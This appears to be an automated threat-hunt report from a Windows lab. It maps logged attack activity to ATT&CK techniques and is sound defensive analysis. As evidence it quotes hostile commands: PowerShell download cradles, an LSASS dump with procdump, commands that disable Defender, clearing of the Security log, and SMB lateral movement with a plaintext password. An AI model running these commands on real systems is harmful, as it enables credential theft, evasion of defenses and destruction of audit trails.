report.executive_summary: Autonomous threat hunt completed. Multiple ATT&CK techniques confirmed.

findings.title: Brute Force Attack Against Administrator Account
findings.description: 15 failed logon attempts targeting the CORP\Administrator account from source IP 192.168.1.105 over a 4-minute period (02:30:03 to 02:34:27). All failed with "Unknown user name or bad password" error on LogonType 3 (network logon). This systematic pattern with varying source ports indicates an automated brute force attack attempting password guessing against a privileged account.

15 total failed logon attempts within 45 minutes
All failures show unknown user or bad password pattern
LogonType 3 (network logon) indicates remote access attempt

findings.title: PowerShell Command Execution with Defense Evasion
findings.description: Multiple PowerShell processes executing suspicious commands with execution policy bypass flags. Commands include disabling real-time monitoring, behavior monitoring, and Windows Defender antispyware. Commands show use of execution bypass (-exec bypass, -ExecutionPolicy Bypass), hidden window execution (-W Hidden), and IEX download cradle pattern typical of living-off-the-land attacks and post-exploitation activities.

powershell.exe -exec bypass -c "Import-Module C:\AtomicRedTeam\... | Time=2024-06-15T02:42:42
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command IEX(New-Object Net.WebClient).DownloadStr | Time=2024-06-15T02:43:19
powershell.exe -c "Get-Process | Where-Object {$_.Name -eq 'lsass'}" | Time=2024-06-15T02:46:20
14 PowerShell-related events total

findings.title: Credential Dumping from LSASS Process
findings.description: Evidence of credential dumping targeting LSASS process memory. PowerShell queried LSASS process (Get-Process | Where-Object {$_.Name -eq 'lsass'}), followed by process access attempt (Sysmon Event ID 10 with GrantedAccess 0x1010), and finally execution of procdump.exe with -ma flag dumping lsass.exe to lsass.dmp file. This is a complete attack chain for extracting credentials from memory for privilege escalation or lateral movement.
evidence: powershell.exe -c "Get-Process | Where-Object {$_.Name -eq 'lsass'}" | Time=2024-06-15T02:46:20
Sysmon Event ID 10: PowerShell accessing lsass.exe with GrantedAccess 0x1010 | Time=2024-06-15T02:49:11
procdump.exe -ma lsass.exe lsass.dmp | Time=2024-06-15T02:49:27
procdump tool located in C:\Tools directory
Sequential execution pattern indicates deliberate credential extraction attack

findings.title: System Reconnaissance and Discovery Activities
findings.description: Systematic execution of system discovery commands from PowerShell context. Commands executed include: systeminfo, whoami /all, net user, hostname, and ipconfig /all. These commands enumerate system information, user context, local users, system name, and network configuration. All executed from elevated PowerShell context with Administrator privileges, indicating post-compromise reconnaissance phase.
evidence: systeminfo | Time=2024-06-15T02:44:40
whoami /all | Time=2024-06-15T02:45:22
ipconfig /all | Time=2024-06-15T02:45:26
All commands executed from PowerShell with CORP\Administrator context

findings.title: Lateral Movement via SMB with Explicit Credentials
findings.description: Direct evidence of lateral movement attempt using net use command to connect to remote SMB share with explicit credentials. Command "net use \\192.168.1.110\C$ /user:Administrator Lab123!" demonstrates attacker attempting to access administrative share (C$) on target host 192.168.1.110 with plaintext password. Followed by network connections (Sysmon Event 3) to 192.168.1.110 and 192.168.1.115 on port 445 (SMB), indicating successful or attempted lateral movement to additional hosts.
evidence: net use \\192.168.1.110\C$ /user:Administrator Lab123! | Time=2024-06-15T03:01:45
Sysmon Event 3: net.exe connecting to 192.168.1.115:445 | Time=2024-06-15T03:01:37
Sysmon Event 3: net.exe connecting to 192.168.1.110:445 | Time=2024-06-15T03:03:47
Plaintext password observable in command line
Multiple target hosts indicate network-wide lateral movement campaign

findings.title: Persistence Mechanisms - Scheduled Task and Registry Modification
findings.description: Evidence of persistence establishment through multiple mechanisms. Scheduled task "Microsoft\\Windows\\WindowsUpdate\\UpdateCheck" created by Administrator containing PowerShell code with IEX download cradle pattern (command obfuscation with -NoP -W Hidden flags). Additionally, registry modification to HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate with suspicious PowerShell path. Both mechanisms designed to survive reboot and maintain access using legitimate Windows update guise for evasion.
evidence: Scheduled Task 'Microsoft\Windows\WindowsUpdate\UpdateCheck' created | Time=2024-06-15T02:53:15
Task contains: powershell.exe -NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadStr
Registry modification: HKLM\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate | Time=2024-06-15T03:06:20
Sysmon Event 13 (Registry SetValue) | Image=reg.exe | Time=2024-06-15T03:06:20
Suspicious directory: C:\Users\Administrator\AppData

findings.title: Log Clearing and Anti-Forensics
findings.description: Execution of wevtutil.exe with 'cl' (clear) parameter targeting the Security event log. Command "wevtutil cl Security" executed as Administrator to clear the security event log, destroying audit trail of malicious activities. This anti-forensics technique indicates attacker awareness of security monitoring and deliberate attempt to cover tracks following post-exploitation activities.
evidence: wevtutil cl Security | Time=2024-06-15T03:15:53
Executed as Administrator user
Security log clearing is final action in attack timeline
Event ID 4688 process creation of wevtutil.exe
Indicates deliberate anti-forensics and cover-up attempt

findings.title: Defense Evasion - Windows Defender Disabled
findings.description: Multiple PowerShell commands executed to disable Windows Defender protection mechanisms. Commands include: Set-MpPreference -DisableRealtimeMonitoring $true and Set-MpPreference -DisableBehaviorMonitoring $true. Registry modification to HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware further disables security protections. These actions render the endpoint vulnerable to malware execution and detection evasion.
evidence: powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true | Time=2024-06-15T02:55:58
powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true | Time=2024-06-15T02:44:54
Sysmon Event 13: Registry modification DisableAntiSpyware | Time=2024-06-15T02:56:28
Target: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware
Sequential execution pattern shows systematic defense disabling
